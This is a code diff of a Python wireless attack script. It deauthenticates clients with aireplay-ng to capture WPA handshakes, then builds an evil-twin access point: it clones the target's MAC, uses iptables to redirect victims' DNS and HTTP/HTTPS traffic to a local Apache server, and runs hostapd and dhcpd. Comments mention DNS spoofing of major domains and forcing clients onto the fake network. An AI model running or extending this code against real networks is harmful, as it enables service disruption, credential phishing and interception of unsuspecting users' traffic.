@@ -39,7 +39,7 @@ def ap_sniffer(pkt) :
                 essid_list.append(essid)
                 print(len(bssid_list),'\t ',channel,'\t ',bssid,'\t ',essid)
 
-def deauth(dist):
+def deauth(dist, bssid_name, iface):
     os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface}")
 
 def handshake_capture():
@@ -53,7 +53,7 @@ def handshake_capture():
         dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
         print("Capturing 4-Way handshake [{}]...".format(bssid_name))
         #start deauthentication process
-        p_deauth = Process(target = deauth(dist))
+        p_deauth = Process(target = deauth(dist, bssid_name, iface))
         p_deauth.start()
         #os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface} | xterm -e airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
         os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
@@ -90,20 +90,30 @@ def change_channel():
 def create_configs(iface, essid, channel_no):
     cf.create_hostapd(iface, essid, channel_no)
     cf.create_dnsmasq(iface)
+    cf.create_dhcpd(essid)
 
 def rogue_ap():
     global iface, bssid_name
     os.system('sudo killall dnsmasq')
-    # os.system(f'ifconfig {iface} down')
-    # os.system(f'macchanger --mac={bssid_name} {iface}')
-    # os.system(f'ifconfig {iface} up')
+    os.system(f'ifconfig {iface} down')
+    os.system(f'macchanger --mac={bssid_name} {iface}')
+    os.system(f'ifconfig {iface} up')
     os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
+    os.system(f'ifconfig {iface} mtu 1400')
     os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
     #ip forwarding
-    os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
-    os.system(f'iptables --append FORWARD --in-interface {iface} -j ACCEPT')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
+    os.system('iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.2.1')
+    os.system('iptables -P FORWARD ACCEPT')
+    os.system(f'iptables --append FORWARD --in-interface {iface} -j ACCEPT')
+    os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
+    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80')
+    os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80')
+    #start configs
+    os.system("service apache2 start")
+    os.system(f"dhcpd -cf dhcpd.conf -pf /var/run/dhcpd.pid {iface} | xterm -hold -e hostapd hostapd.conf")
+    #os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
+    #os.system(f"dnschef --interface 192.168.2.1 --fakeip 192.168.2.1 --fakedomain *.google.com,*.amazon.com")
     
 def main():
     global iface, essid_name, bssid_name, channel_no
@@ -117,11 +127,14 @@ def main():
     handshake_capture()
     client_mac = mac_extract()
     print(client_mac)
-    disable_monitor(iface)
     print("Fake Access Point\nWhen Done Press CTRL+C")
     time.sleep(2.0)
     create_configs(iface, essid_name, channel_no)
+    #da = Process(target = deauth(0, bssid_name, iface))
+    #da.start()
     rogue_ap()
+    #da.terminate() #look at improving rogue ap by forcing client to join the new ap - deauth original ap or dhcp starve
+    disable_monitor(iface)
     
 if __name__ == "__main__":
     main()
